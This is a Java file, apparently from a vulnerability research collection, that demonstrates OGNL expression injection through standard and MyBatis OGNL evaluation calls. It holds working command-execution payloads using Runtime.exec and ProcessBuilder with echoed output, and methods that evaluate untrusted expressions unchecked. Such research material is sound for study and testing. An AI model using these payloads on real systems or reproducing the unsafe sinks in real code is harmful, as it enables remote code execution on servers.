package com.ppp.vulns.core.vulns.expression;

import ognl.Ognl;
import ognl.OgnlContext;

/**
 * @author Whoopsunix
 */
public class OGNL {
    public static void main(String[] args) {
        /**
         * 无回显 set触发
         */
        String execSetPayload = "(@java.lang.Runtime@getRuntime().exec(\'open -a Calculator.app\'))(a)(b)";
//        ognlSetValue(execSetPayload);

        // 回显
        String processBuilderGetPayload1 = "(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#inputStream=#process.getInputStream()).(@org.apache.commons.io.IOUtils@toString(#inputStream,'UTF-8'))";
        Object object = ognlGetValue(processBuilderGetPayload1);
        System.out.println(object);
    }

    /**
     * ognl.Ognl#getValue()
     */
    public static Object ognlGetValue(String payload) {
        try {
            System.out.println(payload);
            Object obj = Ognl.getValue(payload, null);
            return obj;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static Object ognlGetValueSafe(String payload) {
        try {
            System.out.println(payload);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    /**
     * ognl.Ognl#setValue()
     */
    public static void ognlSetValue(String payload) {
        try {
            Ognl.setValue(payload, new OgnlContext(), "");
        } catch (Exception e) {

        }
    }


    /**
     * org.apache.ibatis.ognl.Ognl.getValue()
     */
    public static Object ognlGetValueIbatis(String payload) throws Exception {
        try {
            Object obj = org.apache.ibatis.ognl.Ognl.getValue(payload, null);
            return obj;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    /**
     * org.apache.ibatis.ognl.Ognl.setValue()
     */
    public static void ognlSetValueIbatis(String payload) throws Exception {
        try {
            org.apache.ibatis.ognl.Ognl.setValue(payload, new OgnlContext(), "");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
